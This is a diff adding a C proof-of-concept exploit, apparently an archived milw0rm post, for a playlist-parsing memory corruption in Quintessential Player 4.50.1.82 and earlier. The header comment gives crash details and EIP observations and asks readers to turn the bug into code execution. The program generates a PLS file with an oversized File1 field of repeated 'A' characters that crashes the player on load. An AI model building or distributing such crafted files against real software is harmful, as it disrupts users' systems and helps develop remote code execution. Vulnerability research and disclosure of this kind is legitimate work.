@@ -1,0 +1,99 @@
+/*
+0-day Quintessential Player <= 4.50.1.82 Playlist Denial Of Service PoC
+========================================================================
+========================================================================
+Quintessential Player 4.50.1.82 and lower experiance a memory corruption
+when attempting to parse out malformed Playlist files.
+This possibly could lead to execution of code.  Here is the proof of
+concept in PLS format.
+
+Note: M3u and M3u-8 are also affected by this problem.
+
+EIP gets replaced by semi random values in the memory corruption
+here are my experiances:
+[Buffer = 1028 A's]
+
+Buffer + X  		EIP = 0x009efe5a
+Buffer + X  		EIP = 0x00f6eb81 2nd run
+Buffer + AAAA		EIP = 0x009efde2
+Buffer + AAAA		EIP = 0x009efdb3 2nd run
+Buffer + AAAA		EIP = 0x009efdb6 3rd run
+Buffer + AAAABBBB	EIP = 0x009efdea
+
+(Using the NumberOfEntries made it more consistant)
+Buffer + AAAA		EIP = 0x00e13fd6 for 3 times until
+Buffer + AAAA		EIP = 0x00e13fda
+
+If someone can figure out how to control EIP and cause this to become
+a buffer overflow exploit, this can be exploited just like
+the XMPlayer Buffer Overflow issue or the old Winamp UNC overflow.
+
+if you figure it out, just credit me with my email somewhere in the code,
+ill be more than happy :)
+
+
+Happy Hunting and Happy Holidays to everyone
+
+November 2006 Month Of Greg's Media Player Exploits :)
+Discovered and Reported By: Greg Linares GLinares.code@gmail.com
+Reported Exploit Date: 11/28/2006
+
+*/
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+int main(int argc, char *argv[])
+{
+
+	FILE *Exploit;
+	char buffer[1032]; /* Corruption Occurs after 1028 bytes */
+	int x;
+
+	printf("\n======================================================================\n");
+	printf("0-day Quintessential Player 4.50.1.82 and prior Playlist Denial Of Service PoC \n");
+	printf("Crashes Quintessential Player with a malformed playlist on load.\n");
+	printf("Discovered and Coded By: Greg Linares <GLinares.code[at]gmail[dot]com>\n");
+	printf("Usage: %s <output PLS file>\n", argv[0]);
+	printf("====================================================================\n\n\n");
+
+
+	if (argc < 2) {
+		printf("Invalid Number Of Arguments\n");
+		return 1;
+	}
+
+
+	Exploit = fopen(argv[1],"w");
+    if ( !Exploit )
+    {
+        printf("\nCouldn't Open File!");
+        return 1;
+    }
+
+	memset(buffer, 0, 1030);
+	for (x=0;x<1030;x++) {
+		strcat(buffer, "A");
+	}
+
+
+	/* Any field can be modified to cause the memory corruption NumberofEntries, Length, Filename, Title etc. */
+
+	fputs("[playlist]\r\nVersion=2\r\nNumberOfEntries=1", Exploit);
+	fputs("\r\nFile1=", Exploit);
+	fputs(buffer, Exploit);
+	fputs("\r\nTitle1=0-day_Quintessential_Player_4.50.1.82_and_prior_Playlist_Denial_Of_Service_PoC_By_Greg_Linares\r\n", Exploit);
+	fputs("Length1=512", Exploit);
+
+
+	printf("Exploit Succeeded...\n Output File: %s\n\n", argv[1]);
+
+
+	printf("Questions, Comments, Feedback --> Greg Linares (GLinares.code[at]gmail[dot]com)\n");
+
+	fclose(Exploit);
+	return 0;
+}
+
+// milw0rm.com [2006-11-28]
